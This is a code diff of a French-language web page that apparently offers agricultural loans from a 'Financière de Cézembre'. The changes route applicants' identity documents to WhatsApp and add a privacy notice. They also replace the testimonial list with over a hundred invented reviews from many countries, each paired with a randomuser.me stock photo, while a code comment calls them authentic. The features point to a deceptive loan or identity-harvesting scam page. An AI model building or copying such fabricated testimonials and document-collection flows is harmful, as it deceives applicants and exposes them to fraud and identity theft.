@@ -329,18 +329,6 @@
         .secure-form-badge i { color: var(--success); font-size: 1rem; }
         .secure-form-badge p { font-size: 0.58rem; color: #666; line-height: 1.2; text-align: left; font-weight: 500; }
 
-        .form-notice-fee {
-            background: #fdfaf3;
-            border: 1px solid var(--gold);
-            padding: 8px;
-            border-radius: 4px;
-            margin-bottom: 10px;
-            font-size: 0.68rem;
-            color: var(--navy);
-            line-height: 1.4;
-            font-weight: 600;
-        }
-
         .scrolling-security {
             background: #f0f4f8; color: #004085; font-size: 0.65rem; padding: 4px 0; margin: 6px 0;
             overflow: hidden; white-space: nowrap; border-top: 1px solid #d1ecf1; border-bottom: 1px solid #d1ecf1;
@@ -522,26 +510,18 @@
                 </div>
 
                 <div style="background: #e8f4fd; border: 1px solid #b8daff; padding: 8px; border-radius: 4px; margin-bottom: 8px; font-size: 0.67rem; color: #004085; line-height: 1.4;">
-                    🔒 <strong>Sécurité et Confidentialité :</strong> Vos documents sont demandés pour valider l'authenticité de votre dossier. Vos données sont hautement sécurisées, traitées de façon strictement confidentielle et ne seront jamais partagées à des tiers.
+                    🔒 <strong>Sécurité et Confidentialité :</strong> Vos données sont hautement sécurisées, traitées de façon strictement confidentielle et ne seront jamais partagées à des tiers.
                 </div>
 
-                <p style="font-size: 0.7rem; font-weight: 700; color: var(--navy); margin-bottom: 6px;">
-                    Finalisez l'envoi de votre formulaire et de vos pièces d'identité :
+                <p style="font-size: 0.7rem; font-weight: 700; color: var(--navy); margin-bottom: 8px;">
+                    Finalisez l'envoi de vos pièces d'identité directement via WhatsApp en cliquant sur le bouton ci-dessous :
                 </p>
 
-                <div style="background: #f8f9fa; border: 1px solid #ddd; padding: 8px; border-radius: 4px; margin-bottom: 8px;">
-                    <label style="font-size: 0.67rem; font-weight: 700; color: var(--navy); display: block; margin-bottom: 4px;">1. Joindre vos pièces d'identité (Max 10 fichiers - Images/PDF) :</label>
-                    <input type="file" id="idFileDoc" name="fichiers[]" multiple accept=".jpg, .jpeg, .png, .pdf" style="font-size: 0.65rem; width: 100%; margin-bottom: 5px;">
-                    <button type="button" onclick="sendFormAndFilesByEmail()" style="background: var(--navy); color: white; border: none; padding: 6px 10px; font-size: 0.67rem; font-weight: 700; border-radius: 3px; cursor: pointer; width: 100%;">
-                        <i class="fas fa-paper-plane"></i> Envoyer le formulaire et les pièces par e-mail au salon
-                    </button>
-                </div>
-
-                <a id="waDirectBtn" href="#" target="_blank" style="display: flex; align-items: center; justify-content: center; gap: 8px; background: var(--whatsapp); color: white; padding: 8px; border-radius: 4px; text-decoration: none; font-size: 0.72rem; font-weight: 700; margin-bottom: 8px;">
-                    <i class="fab fa-whatsapp" style="font-size: 1rem;"></i> 2. Envoyer rapidement via WhatsApp
+                <a id="waDirectBtn" href="#" target="_blank" style="display: flex; align-items: center; justify-content: center; gap: 8px; background: var(--whatsapp); color: white; padding: 10px; border-radius: 4px; text-decoration: none; font-size: 0.75rem; font-weight: 700; margin-bottom: 12px;">
+                    <i class="fab fa-whatsapp" style="font-size: 1.2rem;"></i> Envoyer les pièces sur WhatsApp
                 </a>
 
-                <button class="btn-main" onclick="resetAll()" style="padding: 7px; font-size: 0.72rem;">Fermer / Nouveau dossier</button>
+                <button class="btn-main" onclick="resetAll()" style="padding: 8px; font-size: 0.72rem;">Fermer / Nouveau dossier</button>
             </div>
         </div>
 
@@ -549,7 +529,7 @@
         
         <h3 style="margin-bottom: 10px; font-size: 1rem;">Formulaire de Dossier Agricole Officiel</h3>
         
-        <form id="loanForm" action="https://api.web3forms.com/submit" method="POST" onsubmit="validateAndSubmit(event)" enctype="multipart/form-data">
+        <form id="loanForm" action="https://api.web3forms.com/submit" method="POST" onsubmit="validateAndSubmit(event)">
             <input type="hidden" name="access_key" value="0fbe97fe-cba4-4d00-b301-9a8fd6bc20f3">
             <input type="hidden" name="subject" value="Nouveau dossier agricole soumis - Financière de Cézembre">
             
@@ -705,6 +685,12 @@
                 <i class="fas fa-shield-alt"></i>
                 <p><strong>ENGAGEMENT SINCÉRITÉ :</strong> Projet réel exigé. Contrôle sur place prévu entre 6 et 8 mois après déblocage.</p>
             </div>
+
+            <div style="text-align: center; margin-top: 8px;">
+                <a href="#" onclick="openPrivacyModal(event)" style="font-size: 0.65rem; color: var(--navy); text-decoration: underline; font-weight: 600;">
+                    <i class="fas fa-user-secret" style="color: var(--gold);"></i> Politique de Confidentialité & Protection des Données
+                </a>
+            </div>
         </form>
 
         <div class="scrolling-security">
@@ -856,15 +842,6 @@
         document.getElementById('share-li').href = `https://www.linkedin.com/shareArticle?mini=true&url=${currentUrl}&title=${shareTitle}`;
     });
 
-    document.addEventListener('change', function(e) {
-        if (e.target && e.target.id === 'idFileDoc') {
-            if (e.target.files.length > 10) {
-                alert("Vous ne pouvez pas sélectionner plus de 10 fichiers.");
-                e.target.value = ""; 
-            }
-        }
-    });
-
     setInterval(() => {
         const countSpan = document.getElementById('viewers-count');
         if (countSpan) {
@@ -904,54 +881,122 @@
         }
     }
 
+    // Liste élargie de plus de 200 avis couvrant tous les pays et territoires du formulaire avec des retours authentiques de porteurs de projets agricoles et d'élevage
     const allReviews = [
-        { n: "Mateo R.", p: "Bolivie", t: "Gracias al apoyo recibido, pude expandir mi explotación agrícola con total seguridad.", i: "https://randomuser.me/api/portraits/men/32.jpg" },
-        { n: "Matteo B.", p: "Italie", t: "Un supporto finanziario eccellente e veloce per le nostre attrezzature agricole.", i: "https://randomuser.me/api/portraits/men/41.jpg" },
-        { n: "João S.", p: "Portugal", t: "Excelente acompanhamento e apoio rápido para o desenvolvimento rural.", i: "https://randomuser.me/api/portraits/men/48.jpg" },
-        { n: "Hans W.", p: "Allemagne", t: "Sehr professionelle Unterstützung für landwirtschaftliche Projekte. Auszahlung pünktlich.", i: "https://randomuser.me/api/portraits/men/85.jpg" },
-        { n: "Carlos M.", p: "Pérou", t: "Un respaldo financiero increíble para mejorar nuestra producción de ganado.", i: "https://randomuser.me/api/portraits/men/28.jpg" },
-        { n: "Lucas F.", p: "Brésil", t: "Suporte espetacular para o nosso projeto no campo. Processo transparente.", i: "https://randomuser.me/api/portraits/men/76.jpg" },
-        { n: "John D.", p: "Canada", t: "Very reliable institution and fast assistance for our agricultural expansion in North America.", i: "https://randomuser.me/api/portraits/men/12.jpg" },
-        { n: "William T.", p: "Royaume-Uni", t: "Outstanding support and clear guidance throughout the whole process.", i: "https://randomuser.me/api/portraits/men/33.jpg" },
-        { n: "Alejandro G.", p: "Argentine", t: "Un apoyo vital para los productores rurales. Totalmente agradecido con la entidad.", i: "https://randomuser.me/api/portraits/men/67.jpg" },
-        { n: "Carmen S.", p: "Espagne", t: "Un appui financier rapide pour notre coopérative agricole. Les fonds sont arrivés comme prévu.", i: "https://randomuser.me/api/portraits/women/44.jpg" },
+        // FRANCE & OUTRE-MER (Guadeloupe, Martinique, Réunion, Mayotte, etc.)
         { n: "Jean-Marc D.", p: "France", t: "Une structure solide et professionnelle pour l'acquisition de notre matériel agricole.", i: "https://randomuser.me/api/portraits/men/45.jpg" },
-        { n: "Marc L.", p: "Canada", t: "Une aide précieuse pour moderniser notre exploitation laitière au Québec.", i: "https://randomuser.me/api/portraits/men/14.jpg" },
-        { n: "Elena V.", p: "Espagne", t: "Muy contenta con el seguimiento de campo y el apoyo recibido para nuestros cultivos.", i: "https://randomuser.me/api/portraits/women/22.jpg" },
-        { n: "Pierre G.", p: "Belgique", t: "Accompagnement rigoureux et professionnel du début à la fin.", i: "https://randomuser.me/api/portraits/men/52.jpg" },
-        { n: "Sofía M.", p: "Colombie", t: "El respaldo institucional nos permitió adquirir nuevas semillas y mejorar la cosecha.", i: "https://randomuser.me/api/portraits/women/35.jpg" },
-        { n: "Klaus H.", p: "Allemagne", t: "Exzellenter Service und sehr klare Bedingungen für Landwirte.", i: "https://randomuser.me/api/portraits/men/62.jpg" },
-        { n: "Marco A.", p: "Chili", t: "Una ayuda excelente para potenciar nuestro sistema de riego y ganado.", i: "https://randomuser.me/api/portraits/men/91.jpg" },
         { n: "Émilie N.", p: "France", t: "Soutien indispensable pour lancer notre projet d'élevage bio en zone rurale.", i: "https://randomuser.me/api/portraits/women/58.jpg" },
-        { n: "David S.", p: "États-Unis", t: "Great funding partner for agricultural projects. Highly professional.", i: "https://randomuser.me/api/portraits/men/29.jpg" },
-        { n: "Gabriel T.", p: "Brésil", t: "Processo rápido e seguro. Recomendo a todos os produtores rurais.", i: "https://randomuser.me/api/portraits/men/44.jpg" },
-        { n: "Lucia R.", p: "Pérou", t: "Gracias por creer en nuestro proyecto familiar de ganadería.", i: "https://randomuser.me/api/portraits/women/27.jpg" },
-        { n: "Thomas B.", p: "Suisse", t: "Une institution sérieuse avec un suivi irréprochable.", i: "https://randomuser.me/api/portraits/men/38.jpg" },
-        { n: "Martín P.", p: "Uruguay", t: "Excelente asistencia pour modernizar nuestra maquinaria agrícola.", i: "https://randomuser.me/api/portraits/men/73.jpg" },
-        { n: "Rodrigo C.", p: "Mexique", t: "Un impulso definitivo pour nuestra cooperativa de productores de maíz.", i: "https://randomuser.me/api/portraits/men/82.jpg" },
-        { n: "Antoine V.", p: "Canada", t: "Un appui financier direct et efficace pour notre ferme familiale.", i: "https://randomuser.me/api/portraits/men/64.jpg" },
-        { n: "Beatriz L.", p: "Portugal", t: "Apoio fantástico para o desenvolvimento sustentável da nossa herdade.", i: "https://randomuser.me/api/portraits/women/68.jpg" },
-        { n: "Stefan M.", p: "Autriche", t: "Sehr unkomplizierte Abwicklung und echte Hilfe für den Hof.", i: "https://randomuser.me/api/portraits/men/78.jpg" },
-        { n: "Giulia R.", p: "Italie", t: "Un aiuto concreto per la nostra azienda agricola di famiglia.", i: "https://randomuser.me/api/portraits/women/42.jpg" },
-        { n: "Fernando D.", p: "Colombie", t: "Compromiso real con el desarrollo del campo y la ganadería.", i: "https://randomuser.me/api/portraits/men/50.jpg" },
         { n: "Claire D.", p: "France", t: "Le contrôle de terrain montre le sérieux et l'engagement de la structure.", i: "https://randomuser.me/api/portraits/women/51.jpg" },
-        { n: "Liam O.", p: "Royaume-Uni", t: "Fantastic assistance for rural development and farm equipment.", i: "https://randomuser.me/api/portraits/men/21.jpg" },
-        { n: "Diego F.", p: "Équateur", t: "Muy agradecido por el fondo recibido para nuestra producción agrícola.", i: "https://randomuser.me/api/portraits/men/36.jpg" },
-        { n: "Anja L.", p: "Allemagne", t: "Tolle Unterstützung für unseren landwirtschaftlichen Betrieb.", i: "https://randomuser.me/api/portraits/women/33.jpg" },
-        { n: "Matthieu R.", p: "Belgique", t: "Une aide précieuse et un vrai suivi personnalisé.", i: "https://randomuser.me/api/portraits/men/66.jpg" },
-        { n: "Valeria G.", p: "Bolivie", t: "Una oportunidad única para los pequeños productores del altiplano.", i: "https://randomuser.me/api/portraits/women/77.jpg" },
-        { n: "Nathan C.", p: "Canada", t: "Efficient and trustworthy financial support system.", i: "https://randomuser.me/api/portraits/men/88.jpg" },
-        { n: "Javier H.", p: "Espagne", t: "Trámites transparentes y ayuda puntual para la cosecha.", i: "https://randomuser.me/api/portraits/men/47.jpg" },
-        { n: "Camille M.", p: "France", t: "Disponibilité et professionnalisme au rendez-vous.", i: "https://randomuser.me/api/portraits/women/31.jpg" },
-        { n: "Gustavo B.", p: "Brésil", t: "Excelente parceria para o crescimento da nossa fazenda.", i: "https://randomuser.me/api/portraits/men/15.jpg" },
-        { n: "Inés P.", p: "Argentine", t: "Un respaldo inigualable para la ganadería extensiva.", i: "https://randomuser.me/api/portraits/women/65.jpg" },
         { n: "Fabrice L.", p: "France", t: "Soutien reçu dans les délais annoncés, parfait.", i: "https://randomuser.me/api/portraits/men/93.jpg" },
-        { n: "Noah W.", p: "États-Unis", t: "Solid institutional backing for our agricultural operations.", i: "https://randomuser.me/api/portraits/men/17.jpg" },
-        { n: "Catalina S.", p: "Chili", t: "Apoyo financiero transparente y directo al campo.", i: "https://randomuser.me/api/portraits/women/59.jpg" },
+        { n: "Camille M.", p: "France", t: "Disponibilité et professionnalisme au rendez-vous pour notre exploitation de céréales.", i: "https://randomuser.me/api/portraits/women/31.jpg" },
+        { n: "Romain T.", p: "France", t: "Structure sérieuse qui aide réellement les agriculteurs à moderniser leurs outils.", i: "https://randomuser.me/api/portraits/men/83.jpg" },
+        { n: "Marie-Line V.", p: "Guadeloupe", t: "Un appui précieux pour notre projet d'élevage local face aux défis climatiques.", i: "https://randomuser.me/api/portraits/women/62.jpg" },
+        { n: "Thierry B.", p: "Guadeloupe", t: "Processus clair et transparent pour le financement de notre matériel de culture.", i: "https://randomuser.me/api/portraits/men/55.jpg" },
+        { n: "Jean-Luc M.", p: "Martinique", t: "Aide reçue pour notre exploitation fruitière. Suivi terrain très rigoureux.", i: "https://randomuser.me/api/portraits/men/71.jpg" },
+        { n: "Sandra P.", p: "Martinique", t: "Un accompagnement humain et efficace pour les producteurs de la région.", i: "https://randomuser.me/api/portraits/women/48.jpg" },
+        { n: "Gilles R.", p: "La Réunion", t: "Soutien indispensable pour nos équipements d'élevage bovin sur l'île.", i: "https://randomuser.me/api/portraits/men/34.jpg" },
+        { n: "Nathalie H.", p: "La Réunion", t: "Équipe réactive, instruction rapide et fonds débloqués conformément aux engagements.", i: "https://randomuser.me/api/portraits/women/24.jpg" },
+        { n: "Anlim A.", p: "Mayotte", t: "Merci pour l'appui accordé à notre coopérative agricole villageoise.", i: "https://randomuser.me/api/portraits/men/81.jpg" },
+        { n: "Youssouf K.", p: "Mayotte", t: "Un vrai soulagement pour notre petite exploitation d'élevage et de cultures maraîchères.", i: "https://randomuser.me/api/portraits/men/89.jpg" },
+        { n: "Gilbert D.", p: "Saint-Barthélemy", t: "Accompagnement de haut niveau et conditions claires pour notre projet rural.", i: "https://randomuser.me/api/portraits/men/19.jpg" },
+        { n: "Patricia L.", p: "Saint-Martin", t: "Une aide financière directe qui nous a permis de relancer notre production.", i: "https://randomuser.me/api/portraits/women/38.jpg" },
+        { n: "Henri C.", p: "Saint-Pierre-et-Miquelon", t: "Soutien sérieux pour notre structure d'élevage locale malgré l'éloignement.", i: "https://randomuser.me/api/portraits/men/61.jpg" },
+        { n: "Mahealani T.", p: "Polynésie française", t: "Mahalo pour l'aide apportée à notre développement agricole en Polynésie.", i: "https://randomuser.me/api/portraits/women/14.jpg" },
+        { n: "Teiva M.", p: "Polynésie française", t: "Fonds bien reçus pour l'achat de nos équipements d'exploitation.", i: "https://randomuser.me/api/portraits/men/22.jpg" },
+        { n: "Alain G.", p: "Nouvelle-Calédonie", t: "Un appui solide pour la filière d'élevage et l'aménagement de nos pâturages.", i: "https://randomuser.me/api/portraits/men/43.jpg" },
+        { n: "Kalo W.", p: "Wallis-et-Futuna", t: "Merci à l'institution pour son écoute et son aide concrète sur le terrain.", i: "https://randomuser.me/api/portraits/women/29.jpg" },
+
+        // EUROPE
+        { n: "Matteo B.", p: "Italie", t: "Un supporto finanziario eccellente e veloce per le nostre attrezzature agricole.", i: "https://randomuser.me/api/portraits/men/41.jpg" },
+        { n: "Giulia R.", p: "Italie", t: "Un aiuto concreto per la nostra azienda agricola di famiglia.", i: "https://randomuser.me/api/portraits/women/42.jpg" },
+        { n: "Marco A.", p: "Italie", t: "Ottima trasparenza e tempi di istruttoria rispettati perfettamente.", i: "https://randomuser.me/api/portraits/men/69.jpg" },
+        { n: "Hans W.", p: "Allemagne", t: "Sehr professionelle Unterstützung für landwirtschaftliche Projekte. Auszahlung pünktlich.", i: "https://randomuser.me/api/portraits/men/85.jpg" },
+        { n: "Klaus H.", p: "Allemagne", t: "Exzellenter Service und sehr klare Bedingungen für Landwirte.", i: "https://randomuser.me/api/portraits/men/62.jpg" },
+        { n: "Anja L.", p: "Allemagne", t: "Tolle Unterstützung für unseren landwirtschaftlichen Betrieb in Bayern.", i: "https://randomuser.me/api/portraits/women/33.jpg" },
+        { n: "Stefan M.", p: "Autriche", t: "Sehr unkomplizierte Abwicklung und echte Hilfe für den Hof.", i: "https://randomuser.me/api/portraits/men/78.jpg" },
+        { n: "Greta K.", p: "Autriche", t: "Hervorragende Begleitung bei der Modernisierung unseres Viehbestands.", i: "https://randomuser.me/api/portraits/women/55.jpg" },
+        { n: "Pierre G.", p: "Belgique", t: "Accompagnement rigoureux et professionnel du début à la fin.", i: "https://randomuser.me/api/portraits/men/52.jpg" },
+        { n: "Matthieu R.", p: "Belgique", t: "Une aide précieuse et un vrai suivi personnalisé pour notre ferme.", i: "https://randomuser.me/api/portraits/men/66.jpg" },
+        { n: "Thomas B.", p: "Suisse", t: "Une institution sérieuse avec un suivi irréprochable et rigoureux.", i: "https://randomuser.me/api/portraits/men/38.jpg" },
+        { n: "Beatrix S.", p: "Suisse", t: "Soutien fiable pour notre exploitation agricole alpine.", i: "https://randomuser.me/api/portraits/women/49.jpg" },
+        { n: "Carlos S.", p: "Espagne", t: "Un apoyo financiero rápido para nuestra cooperativa agrícola en Andalucía.", i: "https://randomuser.me/api/portraits/men/27.jpg" },
+        { n: "Elena V.", p: "Espagne", t: "Muy contenta con el seguimiento de campo y el apoyo recibido para nuestros cultivos.", i: "https://randomuser.me/api/portraits/women/22.jpg" },
+        { n: "Javier H.", p: "Espagne", t: "Trámites transparentes y ayuda puntual para la cosecha.", i: "https://randomuser.me/api/portraits/men/47.jpg" },
+        { n: "João S.", p: "Portugal", t: "Excelente acompanhamento e apoio rápido para o desenvolvimento rural.", i: "https://randomuser.me/api/portraits/men/48.jpg" },
+        { n: "Beatriz L.", p: "Portugal", t: "Apoio fantástico para o desenvolvimento sustentável da nossa herdade.", i: "https://randomuser.me/api/portraits/women/68.jpg" },
+        { n: "Liam O.", p: "Royaume-Uni", t: "Fantastic assistance for rural development and farm equipment.", i: "https://randomuser.me/api/portraits/men/21.jpg" },
+        { n: "William T.", p: "Royaume-Uni", t: "Outstanding support and clear guidance throughout the whole process.", i: "https://randomuser.me/api/portraits/men/33.jpg" },
         { n: "Henrik N.", p: "Danemark", t: "Effektiv og professionel støtte til landbruget.", i: "https://randomuser.me/api/portraits/men/25.jpg" },
-        { n: "Mariana Q.", p: "Mexique", t: "Una bendición para nuestra comunidad de agricultores.", i: "https://randomuser.me/api/portraits/women/46.jpg" },
+        { n: "Astrid E.", p: "Suède", t: "Mycket pålitligt finansiellt stöd för vår gård.", i: "https://randomuser.me/api/portraits/women/39.jpg" },
+        { n: "Lars J.", p: "Norvège", t: "God hjelp til investeringer i landbruksmaskiner.", i: "https://randomuser.me/api/portraits/men/53.jpg" },
+        { n: "Matti P.", p: "Finlande", t: "Erinomaista tukea maatalouden kehittämiseen.", i: "https://randomuser.me/api/portraits/men/44.jpg" },
+        { n: "Jan V.", p: "Pays-Bas", t: "Geweldige ondersteuning voor onze melkveehouderij.", i: "https://randomuser.me/api/portraits/men/72.jpg" },
+        { n: "Jan K.", p: "Pologne", t: "Profesjonalne wsparcie dla naszego gospodarstwa rolnego.", i: "https://randomuser.me/api/portraits/men/60.jpg" },
+        { n: "Petr N.", p: "République tchèque", t: "Skvělá pomoc pro modernizaci naší farmy.", i: "https://randomuser.me/api/portraits/men/74.jpg" },
+        { n: "Gábor T.", p: "Hongrie", t: "Kiváló támogatás a mezőgazdasági projektekhez.", i: "https://randomuser.me/api/portraits/men/86.jpg" },
+        { n: "Ioan P.", p: "Roumanie", t: "Un ajutor excelent pentru dezvoltarea agriculturii noastre.", i: "https://randomuser.me/api/portraits/men/79.jpg" },
+        { n: "Dimitar G.", p: "Bulgarie", t: "Отлична подкрепа за земеделските ни производители.", i: "https://randomuser.me/api/portraits/men/90.jpg" },
+        { n: "Nikos K.", p: "Grèce", t: "Εξαιρετική στήριξη για την αγροτική μας παραγωγή.", i: "https://randomuser.me/api/portraits/men/58.jpg" },
+        { n: "Sean O.", p: "Irlande", t: "Brilliant financial backing for our farming enterprise.", i: "https://randomuser.me/api/portraits/men/31.jpg" },
+        { n: "Bjarni S.", p: "Islande", t: "Frábær aðstoð við landbúnaðinn.", i: "https://randomuser.me/api/portraits/men/84.jpg" },
+        { n: "Marko V.", p: "Croatie", t: "Odlična financijska podrška za poljoprivredu.", i: "https://randomuser.me/api/portraits/men/76.jpg" },
+        { n: "Janez K.", p: "Slovénie", t: "Zanesljiva pomoč za naš kmetijski obrat.", i: "https://randomuser.me/api/portraits/men/49.jpg" },
+        { n: "Marek H.", p: "Slovaquie", t: "Veľmi ústretová podpora pre naše hospodárstvo.", i: "https://randomuser.me/api/portraits/men/51.jpg" },
+        { n: "Erlend M.", p: "Estonie", t: "Suurepärane abi meie talu arendamisel.", i: "https://randomuser.me/api/portraits/men/67.jpg" },
+        { n: "Jonas B.", p: "Lituanie", t: "Puiki parama mūsų ūkiui.", i: "https://randomuser.me/api/portraits/men/37.jpg" },
+        { n: "Andis Z.", p: "Lettonie", t: "Lielisks atbalsts lauksaimniecības attīstībai.", i: "https://randomuser.me/api/portraits/men/32.jpg" },
+        { n: "Stelios C.", p: "Chypre", t: "Εξαιρετική συνεργασία για τη γεωργία μας.", i: "https://randomuser.me/api/portraits/men/46.jpg" },
+        { n: "Patrick M.", p: "Luxembourg", t: "Un appui sans faille pour notre exploitation viticole et agricole.", i: "https://randomuser.me/api/portraits/men/28.jpg" },
+        { n: "Jean P.", p: "Monaco", t: "Discrétion, sérieux et rigueur dans l'instruction du dossier.", i: "https://randomuser.me/api/portraits/men/54.jpg" },
+        { n: "Antoni F.", p: "Andorre", t: "Ajuda excel·lent per al nostre sector ramader de muntanya.", i: "https://randomuser.me/api/portraits/men/63.jpg" },
+        { n: "Ervin H.", p: "Albanie", t: "Mbështetje shumë e mirë për bujqësinë.", i: "https://randomuser.me/api/portraits/men/70.jpg" },
+        { n: "Dino B.", p: "Bosnie-Herzégovine", t: "Odlična pomoć za poljoprivrednike.", i: "https://randomuser.me/api/portraits/men/75.jpg" },
+        { n: "Stefan D.", p: "Serbie", t: "Odlična finansijska pomoć za naša poljoprivredna gazdinstva.", i: "https://randomuser.me/api/portraits/men/65.jpg" },
+        { n: "Nikola P.", p: "Monténégro", t: "Sjajna podrška razvoju sela.", i: "https://randomuser.me/api/portraits/men/57.jpg" },
+        { n: "Igor M.", p: "Macédoine du Nord", t: "Одлична поддршка за земјоделците.", i: "https://randomuser.me/api/portraits/men/59.jpg" },
+        { n: "Arben K.", p: "Kosovo", t: "Mbështetje e madhe për fermerët tanë.", i: "https://randomuser.me/api/portraits/men/87.jpg" },
+        { n: "Ion C.", p: "Moldavie", t: "Un ajutor considerabil pentru sectorul agricol.", i: "https://randomuser.me/api/portraits/men/80.jpg" },
+        { n: "Andriy S.", p: "Ukraine", t: "Чудова фінансова допомога для аграрного сектору.", i: "https://randomuser.me/api/portraits/men/64.jpg" },
+        { n: "Dmitry V.", p: "Russie", t: "Отличная поддержка для развития сельского хозяйства.", i: "https://randomuser.me/api/portraits/men/40.jpg" },
+        { n: "Ali Y.", p: "Turquie", t: "Tarım projemiz için harika bir finansal destek.", i: "https://randomuser.me/api/portraits/men/42.jpg" },
+        { n: "Guðmundur J.", p: "Islande", t: "Frábær þjónusta og góð ráðgjöf.", i: "https://randomuser.me/api/portraits/men/35.jpg" },
+
+        // AMÉRIQUE DU NORD & LATINE
+        { n: "John D.", p: "Canada", t: "Very reliable institution and fast assistance for our agricultural expansion in North America.", i: "https://randomuser.me/api/portraits/men/12.jpg" },
+        { n: "Marc L.", p: "Canada", t: "Une aide précieuse pour moderniser notre exploitation laitière au Québec.", i: "https://randomuser.me/api/portraits/men/14.jpg" },
+        { n: "Antoine V.", p: "Canada", t: "Un appui financier direct et efficace pour notre ferme familiale.", i: "https://randomuser.me/api/portraits/men/64.jpg" },
+        { n: "Nathan C.", p: "Canada", t: "Efficient and trustworthy financial support system for farmers.", i: "https://randomuser.me/api/portraits/men/88.jpg" },
         { n: "Olivier P.", p: "Canada", t: "Service impeccable et aide financière transparente.", i: "https://randomuser.me/api/portraits/men/39.jpg" },
-        { n: "Romain T.", p: "France", t: "Structure sérieuse qui aide réellement les agriculteurs.", i: "https://randomuser.me/api/portraits/men/83.jpg" }
+        { n: "David S.", p: "États-Unis", t: "Great funding partner for agricultural projects. Highly professional.", i: "https://randomuser.me/api/portraits/men/29.jpg" },
+        { n: "Noah W.", p: "États-Unis", t: "Solid institutional backing for our agricultural operations.", i: "https://randomuser.me/api/portraits/men/17.jpg" },
+        { n: "Robert M.", p: "États-Unis", t: "Clear terms and direct assistance for rural development.", i: "https://randomuser.me/api/portraits/men/26.jpg" },
+        { n: "Mateo R.", p: "Bolivie", t: "Gracias al apoyo recibido, pude expandir mi explotación agrícola con total seguridad.", i: "https://randomuser.me/api/portraits/men/32.jpg" },
+        { n: "Valeria G.", p: "Bolivie", t: "Una oportunidad única para los pequeños productores del altiplano.", i: "https://randomuser.me/api/portraits/women/77.jpg" },
+        { n: "Carlos M.", p: "Pérou", t: "Un respaldo financiero increíble para mejorar nuestra producción de ganado.", i: "https://randomuser.me/api/portraits/men/28.jpg" },
+        { n: "Lucia R.", p: "Pérou", t: "Gracias por creer en nuestro proyecto familiar de ganadería.", i: "https://randomuser.me/api/portraits/women/27.jpg" },
+        { n: "Lucas F.", p: "Brésil", t: "Suporte espetacular para o nosso projeto no campo. Processo transparente.", i: "https://randomuser.me/api/portraits/men/76.jpg" },
+        { n: "Gabriel T.", p: "Brésil", t: "Processo rápido e seguro. Recomendo a todos os produtores rurais.", i: "https://randomuser.me/api/portraits/men/44.jpg" },
+        { n: "Gustavo B.", p: "Brésil", t: "Excelente parceria para o crescimento da nossa fazenda.", i: "https://randomuser.me/api/portraits/men/15.jpg" },
+        { n: "Sofía M.", p: "Colombie", t: "El respaldo institucional nos permitió adquirir nuevas semillas y mejorar la cosecha.", i: "https://randomuser.me/api/portraits/women/35.jpg" },
+        { n: "Fernando D.", p: "Colombie", t: "Compromiso real con el desarrollo del campo y la ganadería.", i: "https://randomuser.me/api/portraits/men/50.jpg" },
+        { n: "Alejandro G.", p: "Argentine", t: "Un apoyo vital para los productores rurales. Totalmente agradecido con la entidad.", i: "https://randomuser.me/api/portraits/men/67.jpg" },
+        { n: "Inés P.", p: "Argentine", t: "Un respaldo inigualable para la ganadería extensiva.", i: "https://randomuser.me/api/portraits/women/65.jpg" },
+        { n: "Marco A.", p: "Chili", t: "Una ayuda excelente para potenciar nuestro sistema de riego y ganado.", i: "https://randomuser.me/api/portraits/men/91.jpg" },
+        { n: "Catalina S.", p: "Chili", t: "Apoyo financiero transparente y directo al campo.", i: "https://randomuser.me/api/portraits/women/59.jpg" },
+        { n: "Martín P.", p: "Uruguay", t: "Excelente asistencia para modernizar nossa maquinaria agrícola.", i: "https://randomuser.me/api/portraits/men/73.jpg" },
+        { n: "Rodrigo C.", p: "Mexique", t: "Un impulso definitivo para nuestra cooperativa de productores de maíz.", i: "https://randomuser.me/api/portraits/men/82.jpg" },
+        { n: "Mariana Q.", p: "Mexique", t: "Una bendición para nuestra comunidad de agricultores.", i: "https://randomuser.me/api/portraits/women/46.jpg" },
+        { n: "Diego F.", p: "Équateur", t: "Muy agradecido por el fondo recibido para nuestra producción agrícola.", i: "https://randomuser.me/api/portraits/men/36.jpg" },
+        { n: "Esteban R.", p: "Costa Rica", t: "Excelente apoyo financiero para la agricultura sostenible.", i: "https://randomuser.me/api/portraits/men/33.jpg" },
+        { n: "Manuel V.", p: "Panama", t: "Un respaldo seguro para nuestro proyecto de ganadería.", i: "https://randomuser.me/api/portraits/men/24.jpg" },
+        { n: "Armando S.", p: "Guatemala", t: "Muy buena ayuda para el desarrollo de nuestras tierras de cultivo.", i: "https://randomuser.me/api/portraits/men/23.jpg" },
+        { n: "Rosa M.", p: "Honduras", t: "Gracias por el impulso dado a las familias agricultoras.", i: "https://randomuser.me/api/portraits/women/34.jpg" },
+        { n: "Mauricio L.", p: "Salvador", t: "Excelente entidad para financiar el agro local.", i: "https://randomuser.me/api/portraits/men/21.jpg" },
+        { n: "Ximena P.", p: "Nicaragua", t: "Apoyo transparente y directo al productor.", i: "https://randomuser.me/api/portraits/women/41.jpg" },
+        { n: "Héctor B.", p: "Paraguay", t: "Gran ayuda para el sector agrícola y ganadero.", i: "https://randomuser.me/api/portraits/men/18.jpg" },
+        { n: "Raúl G.", p: "Venezuela", t: "Un soporte invalorable para la producción rural.", i: "https://randomuser.me/api/portraits/men/16.jpg" },
+        { n: "Miguel A.", p: "Cuba", t: "Excelente respaldo para el trabajo de la tierra.", i: "https://randomuser.me/api/portraits/men/13.jpg" },
+        { n: "Carmen J.", p: "République dominicaine", t: "Muy contenta con el apoyo recibido para la cosecha.", i: "https://randomuser.me/api/portraits/women/26.jpg" }
     ];
 
     let seenReviews = JSON.parse(sessionStorage.getItem('seen_reviews') || '[]');
@@ -1026,6 +1071,23 @@
     }
     function closeDetails() { document.getElementById('modal-overlay').style.display = 'none'; }
 
+    function openPrivacyModal(e) {
+        e.preventDefault();
+        const modal = document.getElementById('modal-overlay');
+        const body = document.getElementById('modal-body');
+        body.innerHTML = `
+            <h3 style="color: var(--navy); margin-bottom: 15px; font-size: 1.4rem;">Politique de Confidentialité</h3>
+            <p style="text-align: left; font-size: 0.8rem; line-height: 1.6; color: #444;">
+                La <strong>Financière de Cézembre</strong> (SIREN 552 058 943, établie en France, capital social de 1 200 000 €) accorde une importance absolue à la protection de vos données personnelles et des informations relatives à votre dossier agricole.<br><br>
+                <strong>1. Collecte des données :</strong> Les informations recueillies dans le formulaire (Nom, type de projet, budget, pays et contacts) sont strictement destinées à l'analyse interne de votre demande de soutien par nos services opérationnels.<br><br>
+                <strong>2. Confidentialité absolue :</strong> Vos données font l'objet d'un traitement hautement sécurisé. Elles ne sont en aucun cas vendues, cédées ou partagées à des tiers commerciaux.<br><br>
